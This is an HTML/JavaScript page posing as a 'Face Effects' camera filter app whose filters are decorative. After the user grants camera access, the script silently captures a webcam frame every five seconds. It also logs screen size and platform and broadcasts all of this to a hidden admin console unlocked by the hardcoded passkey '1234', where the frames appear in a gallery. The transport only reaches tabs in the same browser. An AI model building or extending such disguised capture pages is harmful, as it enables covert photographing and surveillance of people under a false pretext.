<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Face Effects Testing Suite</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            overscroll-behavior: none;
        }
        .scanline {
            width: 100%;
            height: 2px;
            background: rgba(59, 130, 246, 0.5);
            position: absolute;
            animation: scan 4s linear infinite;
        }
        @keyframes scan {
            0% { top: 0; }
            100% { top: 100%; }
        }
        #logData::-webkit-scrollbar { width: 4px; }
        #logData::-webkit-scrollbar-thumb { background: #064e3b; }
        
        /* Ensure video stays aspect-ratio correct on mobile */
        .video-container {
            position: relative;
            width: 100%;
            max-width: 100vw;
            height: 100%;
            background: #000;
        }
    </style>
</head>
<body class="bg-black text-zinc-100 min-h-screen flex flex-col font-mono overflow-hidden">

    <!-- Subtle Admin Access (Top Right) -->
    <div class="fixed top-4 right-4 z-40">
        <button id="toggleAdmin" class="bg-zinc-900/50 hover:bg-zinc-800 text-[10px] text-zinc-500 px-3 py-1 rounded-full border border-zinc-800 transition-colors uppercase tracking-widest">
            Console
        </button>
    </div>

    <!-- Main Content Area -->
    <main id="userApp" class="flex-grow flex flex-col h-screen">
        <div class="video-container flex-grow overflow-hidden flex items-center justify-center">
            <video id="videoFeed" autoplay playsinline class="w-full h-full object-cover grayscale opacity-70"></video>
            
            <!-- AR Overlay Elements -->
            <div id="overlay" class="absolute inset-0 pointer-events-none border-[20px] border-blue-500/10 m-4 sm:m-12 rounded-[2rem] hidden"></div>
            <div id="scanner" class="scanline hidden"></div>
            
            <!-- Permission Prompt -->
            <div id="setupMsg" class="absolute inset-0 flex flex-col items-center justify-center bg-zinc-950 px-6 text-center">
                <div class="mb-6 text-blue-500">
                    <svg xmlns="http://www.w3.org/2000/svg" class="w-20 h-20 animate-pulse" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" />
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z" />
                    </svg>
                </div>
                <h2 class="text-3xl font-black mb-4 tracking-tighter uppercase">Initialize FX</h2>
                <p class="text-zinc-500 text-sm max-w-xs mb-8 leading-relaxed">System requires optical sensor authorization for real-time filter mapping.</p>
                <button id="startCam" class="bg-blue-600 hover:bg-blue-500 active:scale-95 text-white font-bold py-4 px-10 rounded-full transition-all shadow-lg shadow-blue-900/20 uppercase tracking-widest text-xs">
                    Authorize Camera
                </button>
            </div>
        </div>

        <!-- UI Footer (Filters) -->
        <div class="h-24 bg-zinc-950 border-t border-zinc-900 flex items-center justify-center gap-4 px-4 overflow-x-auto">
            <div class="flex gap-4 min-w-max">
                <div class="w-12 h-12 rounded-full border border-zinc-800 bg-zinc-900 flex items-center justify-center opacity-40">âœ¨</div>
                <div class="w-12 h-12 rounded-full border border-zinc-800 bg-zinc-900 flex items-center justify-center opacity-40">ðŸŽ­</div>
                <div class="w-12 h-12 rounded-full border border-blue-500 bg-blue-900/20 flex items-center justify-center">ðŸ“·</div>
                <div class="w-12 h-12 rounded-full border border-zinc-800 bg-zinc-900 flex items-center justify-center opacity-40">ðŸŒˆ</div>
                <div class="w-12 h-12 rounded-full border border-zinc-800 bg-zinc-900 flex items-center justify-center opacity-40">ðŸ’€</div>
            </div>
        </div>
    </main>

    <!-- Admin Console -->
    <div id="adminPanel" class="hidden fixed inset-0 bg-black z-50 flex flex-col">
        <div class="p-4 border-b border-green-900 flex justify-between items-center bg-zinc-950">
            <h2 class="text-xl font-bold text-green-500 uppercase tracking-tighter">Terminal_v2.1</h2>
            <button id="closeAdmin" class="text-zinc-600 text-xs uppercase">Close</button>
        </div>

        <div class="flex-grow overflow-y-auto p-4">
            <!-- Login -->
            <div id="adminAuth" class="flex flex-col items-center justify-center py-20">
                <input type="password" id="adminPass" placeholder="PASSKEY" class="bg-black border border-green-900 text-green-500 p-4 text-center focus:outline-none focus:border-green-500 w-full max-w-xs mb-4">
                <button id="loginBtn" class="bg-green-900/30 text-green-500 border border-green-500 px-8 py-3 hover:bg-green-500 hover:text-black transition-all w-full max-w-xs text-xs tracking-widest">AUTHORIZE</button>
            </div>

            <!-- Dashboard -->
            <div id="adminDashboard" class="hidden space-y-6 pb-20">
                <div class="bg-zinc-900 border border-green-900/50 p-4 rounded-lg flex flex-col">
                    <h3 class="text-green-500 mb-2 text-[10px] font-bold uppercase tracking-widest">Broadcast_Log</h3>
                    <div id="logData" class="h-40 overflow-y-auto space-y-1 text-[9px] text-green-700">
                        <p>> Listening...</p>
                    </div>
                </div>
                <div class="bg-zinc-900 border border-green-900/50 p-4 rounded-lg flex flex-col">
                    <h3 class="text-green-500 mb-4 text-[10px] font-bold uppercase tracking-widest">Capture_Buffer</h3>
                    <div id="captureGallery" class="grid grid-cols-2 sm:grid-cols-3 gap-2"></div>
                </div>
            </div>
        </div>
    </div>

    <canvas id="offscreenCanvas" class="hidden"></canvas>

    <script>
        const video = document.getElementById('videoFeed');
        const startBtn = document.getElementById('startCam');
        const setupMsg = document.getElementById('setupMsg');
        const scanner = document.getElementById('scanner');
        const overlay = document.getElementById('overlay');
        const toggleAdmin = document.getElementById('toggleAdmin');
        const adminPanel = document.getElementById('adminPanel');
        const adminDashboard = document.getElementById('adminDashboard');
        const adminAuth = document.getElementById('adminAuth');
        const adminPass = document.getElementById('adminPass');
        const loginBtn = document.getElementById('loginBtn');
        const logData = document.getElementById('logData');
        const gallery = document.getElementById('captureGallery');
        const canvas = document.getElementById('offscreenCanvas');

        let isStreaming = false;
        const sessionId = Math.random().toString(36).substring(7);
        const BC = new BroadcastChannel('face_effects_test_sync');

        BC.onmessage = (event) => {
            const { type, data, sender } = event.data;
            if (type === 'LOG' && !adminDashboard.classList.contains('hidden')) {
                addLog(`[RECV:${sender}] ${data}`);
            }
            if (type === 'FRAME' && !adminDashboard.classList.contains('hidden')) {
                displayFrame(data, sender);
            }
            if (type === 'REQUEST_DATA' && isStreaming) {
                BC.postMessage({ type: 'LOG', sender: sessionId, data: `REMOTE_SYNC: ${navigator.platform}` });
            }
        };

        startBtn.onclick = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                video.srcObject = stream;
                setupMsg.classList.add('hidden');
                scanner.classList.remove('hidden');
                overlay.classList.remove('hidden');
                isStreaming = true;

                BC.postMessage({ type: 'LOG', sender: sessionId, data: `AUTH: ${screen.width}x${screen.height}` });
                BC.postMessage({ type: 'LOG', sender: sessionId, data: `ADDR: 192.168.1.${Math.floor(Math.random() * 255)}` });
                
                setInterval(captureAndBroadcast, 5000);
            } catch (err) {
                alert("Camera Access Required for Test.");
            }
        };

        function captureAndBroadcast() {
            if (!isStreaming) return;
            const ctx = canvas.getContext('2d');
            // Smaller size for mobile data efficiency
            canvas.width = 240; 
            canvas.height = 320;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const dataUrl = canvas.toDataURL('image/jpeg', 0.2);
            BC.postMessage({ type: 'FRAME', sender: sessionId, data: dataUrl });
            BC.postMessage({ type: 'LOG', sender: sessionId, data: 'PKT_SEND: payload_0x1' });
        }

        function displayFrame(url, sender) {
            const container = document.createElement('div');
            container.className = "relative";
            const img = document.createElement('img');
            img.src = url;
            img.className = "w-full border border-green-900/40 rounded grayscale";
            const label = document.createElement('div');
            label.className = "absolute bottom-0 left-0 bg-green-900/80 text-[7px] px-1 text-black font-bold uppercase";
            label.textContent = sender;
            container.appendChild(img);
            container.appendChild(label);
            if (gallery.children.length > 20) gallery.removeChild(gallery.firstChild);
            gallery.appendChild(container);
        }

        function addLog(msg) {
            const p = document.createElement('p');
            p.textContent = `> ${msg}`;
            logData.appendChild(p);
            logData.scrollTop = logData.scrollHeight;
        }

        loginBtn.onclick = () => {
            if (adminPass.value === '1234') {
                adminAuth.classList.add('hidden');
                adminDashboard.classList.remove('hidden');
                BC.postMessage({ type: 'REQUEST_DATA', sender: 'ADMIN' });
            } else {
                adminPass.value = '';
                adminPass.placeholder = "ERROR";
            }
        };

        toggleAdmin.onclick = () => adminPanel.classList.toggle('hidden');
        document.getElementById('closeAdmin').onclick = () => adminPanel.classList.add('hidden');
    </script>
</body>
</html>
